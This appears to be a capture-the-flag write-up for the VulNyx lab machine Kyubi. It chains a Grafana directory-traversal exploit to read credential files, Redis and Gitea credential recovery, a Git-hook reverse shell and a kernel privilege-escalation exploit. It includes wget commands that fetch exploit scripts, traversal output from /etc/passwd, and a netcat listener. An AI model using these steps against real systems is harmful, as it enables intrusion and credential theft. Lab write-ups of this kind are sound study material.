---

title: "Kyubi | VulNyx Writeup"
date: 2026-09-25T17:50:21+05:30
description: "VulNyx Kyubi writeup covering Grafana directory traversal, sensitive configuration disclosure, Redis credential recovery, Gitea Git Hook command execution, and Linux kernel privilege escalation through CVE-2026-43503."
summary: "Compromised the Kyubi machine by exploiting Grafana CVE-2021-43798 to read local files and recover a Redis password, extracting Gitea administrator credentials from Redis, abusing a Gitea repository Git Hook to obtain a gitea shell, and escalating to root through the DirtyClone kernel vulnerability CVE-2026-43503."
platform: "vulnyx"
difficulty: "medium"
os: "Linux"
status: "active"
featured: true
featured_image: "/images/writeups/vulnyx/Kyubi.png"
tags: ["linux", "grafana", "cve-2021-43798", "directory-traversal", "file-disclosure", "information-disclosure", "credentials", "redis", "redis-enumeration", "gitea", "source-control", "git-hooks", "command-execution", "reverse-shell", "tty", "kernel-exploitation", "cve-2026-43503", "dirtyclone", "privilege-escalation"]
skills: ["nmap", "grafana", "cve-2021-43798", "directory-traversal", "file-disclosure", "redis-cli", "redis", "gitea", "git-hooks", "reverse-shell", "netcat", "linux-enumeration", "uname", "kernel-exploitation", "cve-2026-43503", "dirtyclone", "privilege-escalation"]
comments: false
draft: false
------------

## Overview

<img width="842" height="438" alt="kyubi-vulnyx" src="/images/writeups/vulnyx/Kyubi.png" />

Kyubi is a medium VulNyx machine that focuses on Grafana exploitation, sensitive configuration disclosure, Redis enumeration, credential reuse, Gitea Git Hook command execution, and Linux kernel privilege escalation.


### Key Vulnerabilities

* Grafana Directory Traversal — `CVE-2021-43798`
* Sensitive Grafana Configuration Disclosure
* Redis Credential Exposure
* Redis Credential Enumeration
* Gitea Credential Disclosure
* Gitea Git Hook Command Execution
* Malicious Repository Hook
* Reverse Shell as `gitea`
* Linux Kernel Vulnerability — `CVE-2026-43503`
* DirtyClone Local Privilege Escalation
* Root Privilege Escalation

---

## 🔎 Enumeration

### Nmap Scan

First, perform a full TCP port scan with service and version detection:

```bash
nmap -n -Pn -sVC -p- --min-rate 5000 192.168.1.93
```

### Results

```text 
$ nmap -n -Pn -sVC -p- --min-rate 5000 192.168.1.93
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-25 02:17 -0700
Nmap scan report for 192.168.1.93
Host is up (0.0014s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b5:0b:db:85:41:fe:44:02:c9:f9:a3:17:05:af:fa:3d (ECDSA)
|_  256 c8:c4:c0:fc:ac:16:ef:8d:4e:67:dd:df:bc:88:f8:6e (ED25519)
80/tcp    open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://192.168.1.93/
443/tcp   open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-title: Kyubi Source Control
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp  open  http     Golang net/http server
|_http-title: Kyubi Source Control
3001/tcp  open  http     Grafana http
| http-title: Grafana
|_Requested resource was /login
| http-robots.txt: 1 disallowed entry 
6379/tcp  open  redis    Redis key-value store
9090/tcp  open  http     Golang net/http server
|_http-title: Node Exporter
41505/tcp open  http     Jenkins httpd 2.387.3
|_http-server-header: 192.168.1.93
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.93 seconds
```

The following services are exposed:

- **22/tcp** — SSH / OpenSSH 8.9p1
- **80/tcp** — HTTP / Nginx 1.18.0
- **443/tcp** — HTTPS / Nginx 1.18.0
- **3000/tcp** — Kyubi Source Control
- **3001/tcp** — Grafana http
- **6379/tcp** — Redis key-value store
- **9090/tcp** — Node Exporter
- **41505/tcp** — Jenkins httpd 2.387.3


The main attack surface appears to be the collection of internally hosted development and monitoring services.

---

## 🌐 Web Enumeration

### Ports 80, 443 and 3000

<img width="1918" height="859" alt="Screenshot_2026-09-25_02_47_43" src="https://github.com/user-attachments/assets/cb726957-7f0f-43ee-a222-932bd0f30084" />

Opening ports `80`, `443`, and `3000` reveals the same interface:

```text
Kyubi Source Control
```

The source-control application becomes an interesting target, but no credentials are available yet.

---

## 📊 Grafana Enumeration

Port `3001` hosts Grafana:

```text
http://192.168.1.93:3001/
```

<img width="1918" height="851" alt="Screenshot_2026-09-25_03_04_51" src="https://github.com/user-attachments/assets/0b123a1d-64b2-44b5-8fcd-d25923028b29" />

The application presents a Grafana login page.

At this stage, valid credentials are not available.

Attempts to determine the exact Grafana version through normal enumeration are unsuccessful, so known Grafana vulnerabilities are investigated.

One relevant vulnerability is: `CVE-2021-43798`

> **CVE-2021-43798** is a directory traversal vulnerability affecting certain Grafana 8.x releases. Under vulnerable configurations, an unauthenticated attacker can access local files through Grafana's plugin-serving functionality.

---

## 💥 Grafana CVE-2021-43798

Download the exploit:

```bash
wget https://raw.githubusercontent.com/hupe1980/CVE-2021-43798/refs/heads/main/exploit.py
```

Test access to `/etc/passwd`:

```text 
$ python3 exploit.py http://192.168.1.93:3001 /etc/passwd | grep bash                                 
[+] Trying path http://192.168.1.93:3001/public/plugins/barchart/../../../../../../../../../../../../../etc/passwd
[+] File content:
[+] Done
root:x:0:0:root:/root:/bin/bash
kyubi:x:1000:1000:Kyubi:/home/kyubi:/bin/bash
postgres:x:110:115:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
gitea:x:1001:1001::/opt/gitea:/bin/bash
jenkins:x:1002:1002::/var/lib/jenkins:/bin/bash
developer:x:1003:1003::/home/developer:/bin/bash
sysadmin:x:1004:1004::/home/sysadmin:/bin/bash
```

This confirms that the Grafana instance is vulnerable.

Several local users are also identified, including:

```text 
kyubi
gitea
jenkins
developer
sysadmin
```

---

## 📄 Reading Grafana Configuration

Since arbitrary local files can be retrieved, the Grafana configuration file is targeted:

```text
/etc/grafana/grafana.ini
```

Retrieve it:

```bash id="q5x7n3"
python3 exploit.py http://192.168.1.93:3001 /etc/grafana/grafana.ini | grep -A 3 "external_services"
```

The output reveals:

```text 
$ python3 exploit.py http://192.168.1.93:3001 /etc/grafana/grafana.ini | grep -A 3 "external_services"
[+] Trying path http://192.168.1.93:3001/public/plugins/welcome/../../../../../../../../../../../../../etc/grafana/grafana.ini
[+] File content:
[+] Done
[external_services]
# redis_host = 127.0.0.1:6379
# redis_password = R3d1sS3cur3P@ss2026

[external_services]
# redis_host = 127.0.0.1:6379
# redis_password = R3d1sS3cur3P@ss2026
```

The Redis password is therefore discovered:

```
R3d1sS3cur3P@ss2026
```

Nmap already identified Redis on: `6379/tcp`.

This provides the next path for enumeration.

---

## 🔴 Redis Enumeration

Connect to Redis:

```bash 
redis-cli -h 192.168.1.93
```

Authenticate and List the available keys:

```text
$ redis-cli -h 192.168.1.93
192.168.1.93:6379> AUTH R3d1sS3cur3P@ss2026
OK
192.168.1.93:6379> KEYS *
 1) "app:config:gitea_admin"
 2) "config:app_version"
```

The key:

```text
app:config:gitea_admin
```

looks particularly interesting.

Retrieve it:

```text 
192.168.1.93:6379> GET app:config:gitea_admin
"{\"user\":\"gitadmin\",\"pass\":\"G1tAdm1n2025!\",\"url\":\"http://127.0.0.1:3000\"}"
192.168.1.93:6379> 
```

This provides valid Gitea credentials:

```text 
Username: gitadmin
Password: G1tAdm1n2025!
URL:      http://127.0.0.1:3000
```

---

## 🦊 Gitea Access

Navigate to:

```text
http://192.168.1.93:3000/
```

Select **Sign In** and use the recovered credentials:

<img width="1918" height="856" alt="Screenshot_2026-09-25_03_54_31" src="https://github.com/user-attachments/assets/cc7dfdda-f0bf-4b07-826f-02cdf5f683a5" />

```text 
Username: gitadmin
Password: G1tAdm1n2025!
```

Authentication succeeds.

We now have access to the `Gitea` source-control portal as `gitadmin`.

<img width="1918" height="854" alt="Screenshot_2026-09-25_03_58_03" src="https://github.com/user-attachments/assets/b8c27e53-f0a8-4a4c-8cd9-daaf92061b11" />

Gitea is a Git-based software development platform providing repository hosting and collaboration features.

---

## 🪝 Gitea Git Hook Exploitation

The next objective is to obtain command execution through repository hooks.

Navigate to the `nexus-platform` repository.

<img width="1918" height="862" alt="Screenshot_2026-09-25_04_05_30" src="https://github.com/user-attachments/assets/cf0eebe8-ff2f-4809-8c7a-65be51de06ed" />

Open: `Settings`

Then navigate to `Git Hooks`

<img width="1918" height="860" alt="Screenshot_2026-09-25_04_05_37" src="https://github.com/user-attachments/assets/a9baa4db-6d11-4776-b7d1-b174d8fb07b7" />

The repository exposes several hooks:

```text 
pre-receive
update
post-receive
```

Open the `update` hook.

<img width="1918" height="860" alt="Screenshot_2026-09-25_04_05_37" src="https://github.com/user-attachments/assets/9075e06b-da3f-408c-8101-47acef285d3a" />

Modify it to contain a reverse-shell payload.

<img width="1918" height="842" alt="Screenshot_2026-09-25_04_11_10" src="https://github.com/user-attachments/assets/182175d5-d779-4b1f-8475-4becd52d3712" />

Save the modified hook using: `Update Hook`

---

## 🐚 Triggering the Git Hook

Start a listener on the attacking machine:

```bash 
nc -lnvp 4444
```

The Git hook needs to be triggered by a repository update.

Open: `README.md`

Add a small change to the file and commit it.

<img width="1918" height="854" alt="Screenshot_2026-09-25_04_19_31" src="https://github.com/user-attachments/assets/6f34f0a1-fd53-4f24-b9a5-1ea7176ea95b" />


The repository update triggers the malicious Git hook.

The listener receives a connection:

```text 
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.1.28] from (UNKNOWN) [192.168.1.93] 41374
id ;hostname
uid=1001(gitea) gid=1001(gitea) groups=1001(gitea)
kyubi
```

We now have a shell as: `gitea`

---

## 🖥️ Reverse Shell TTY Upgrade

Upgrade the reverse shell:

```bash 
script /dev/null -c bash
```

Press: `Ctrl + Z`

Then:

```bash 
stty raw -echo; fg
```

Reset the terminal:

```bash 
reset xterm
```

Set the environment:

```bash 
export TERM=xterm
export BASH=bash
```

Set the terminal size:

```bash
stty cols 160 rows 45
```

The reverse shell is now upgraded to an interactive TTY.

---

## 🔐 Local Privilege Escalation Enumeration

Standard privilege-escalation checks were performed:

* SUID binaries
* Linux capabilities
* `sudo -l`

Nothing immediately useful was discovered.

The kernel version is then checked:

```bash 
uname -r
```

Output:

```text
gitea@kyubi:~$ uname -r 
5.15.0-171-generic
gitea@kyubi:~$
```

---

## 🐧 Kernel Exploitation — DirtyClone

Further vulnerability research identifies the kernel as vulnerable to: `CVE-2026-43503 — DirtyClone`



> **DirtyClone** is a Linux kernel local privilege-escalation vulnerability involving improper flag propagation in `__pskb_copy_fclone()` when used with the TEE netfilter target and ESP-in-UDP.

The vulnerability can allow an unprivileged local user to manipulate file-backed page-cache memory and ultimately obtain elevated privileges.

---

## 💥 Exploiting CVE-2026-43503

Download the exploit:

```bash
wget https://raw.githubusercontent.com/ProjectZeroDays/cve-2026-43503/refs/heads/main/dirtyclone.py
```

Run the exploit:

```bash 
python3 dirtyclone.py
```

The exploit reports:

```text 
gitea@kyubi:~$ python3 dirtyclone.py 
[*] CVE-2026-43503 (DirtyClone) local privilege escalation
[*] uid=1001 -> root
[+] injected uid 0 account 'firefart' (password: pwned)
Password: 
uid=0(root) gid=0(root) groups=0(root)
[+] root achieved
Password: 
root@kyubi:/opt/gitea/data/home# id ;hostname
id ;hostname
uid=0(root) gid=0(root) groups=0(root)
kyubi
```

A root shell is obtained.

The machine has now been fully compromised with root privileges.

---

## 🏴 Flags

### User Flag

```bash 
cat /home/developer/user.txt
```

```text 
root@kyubi:~# cat /home/developer/user.txt
9e88f7434e40990c1aec3e6a4251dadd
```

### Root Flag

```bash 
cat /root/root.txt
```

```text
root@kyubi:~# cat /root/root.txt
e79950c85e8509ebf0c644bbbb750bbe
```

---

Grafana Directory Traversal
## 🧾 Summary

| Stage                     | Technique / Finding                |
| ------------------------- | ---------------------------------- |
| **Reconnaissance**        | Full TCP Nmap scan                 |
| **Web Services**          | Nginx / Gitea / Grafana            |
| **Initial Vulnerability** | Grafana CVE-2021-43798             |
| **File Disclosure**       | Grafana directory traversal        |
| **Sensitive File**        | `/etc/grafana/grafana.ini`         |
| **Credential Discovery**  | Redis password                     |
| **Redis Access**          | `redis-cli`                        |
| **Credential Discovery**  | Gitea admin credentials            |
| **Source Control**        | Gitea                              |
| **Authenticated User**    | `gitadmin`                         |
| **Repository**            | `nexus-platform`                   |
| **Execution Technique**   | Git Hook                           |
| **Initial Shell User**    | `gitea`                            |
| **Kernel Version**        | `5.15.0-171-generic`               |
| **Privilege Escalation**  | CVE-2026-43503                     |
| **Kernel Exploit**        | DirtyClone                         |
| **Final Privilege**       | `root`                             |


---

## 🚀 Key Takeaways

* Always perform a **full TCP scan** because development infrastructure often exposes multiple services.
* Monitoring and administration applications such as Grafana can become valuable attack surfaces even when authentication is enabled.
* File traversal vulnerabilities can expose configuration files containing credentials for other internal services.
* Credentials discovered in one service should be evaluated against the other services exposed on the target.
* Redis databases can contain application configuration and credentials when improperly secured.
* Source-control platforms such as Gitea can provide powerful code-execution primitives when repository hooks are improperly exposed.
* Git hooks should be treated as executable code and restricted appropriately.
* After obtaining a shell, enumerate the kernel version when standard privilege-escalation techniques do not immediately provide a path.
* Kernel vulnerabilities can provide local privilege escalation when the target kernel falls within an affected version range.
* The overall attack demonstrates how multiple seemingly separate services can form a complete attack chain:

---

